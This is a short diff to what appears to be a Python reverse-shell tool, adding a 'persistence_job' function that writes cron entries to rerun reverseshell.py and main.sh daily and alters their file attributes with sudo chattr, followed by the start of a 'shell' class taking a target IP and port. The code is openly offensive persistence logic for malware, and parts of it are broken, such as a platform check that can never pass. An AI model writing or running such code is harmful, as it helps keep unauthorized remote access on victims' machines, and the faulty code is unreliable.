@@ -1,5 +1,36 @@
 #!/usr/bin/env
 
+def persistence_job():
+    from subprocess import run
+    import platform
+    import time
+    import os
+    os.system('clear')
+
+    if platform == "linux" or platform == "linux2":
+        try:
+            FILE_CHECK = os.path.exists("reverseshell_self.py")
+            if FILE_CHECK == True:
+                run(f"echo '37 13 * * * reverseshell.py' | crontab -e", shell=True)
+                os.system('sudo chattr -i reverseshell.py')
+                time.sleep(1)
+                run(f"echo '37 13 * * * main.sh' | crontab -e", shell=True)
+                os.system('sudo chattr -i main.sh')
+                time.sleep(1)
+            
+        except FileNotFoundError:
+            run(f"echo '01 08 * * * /usr/bin/reverseshell.py' | crontab -e", shell=True)
+            os.system('sudo chattr -i /usr/bin/reverseshell.py')
+            time.sleep(1)
+            run(f"echo '01 08 * * * /usr/bin/main.sh' | crontab -e", shell=True)
+            os.system('sudo chattr -i /usr/bin/main.sh')
+            time.sleep(1)
+                
+        os.system('clear')
+            
+    else:
+        pass
+
 class shell:
     
     def __init__(self, TARGET_IPADDRESS, TARGET_PORT):
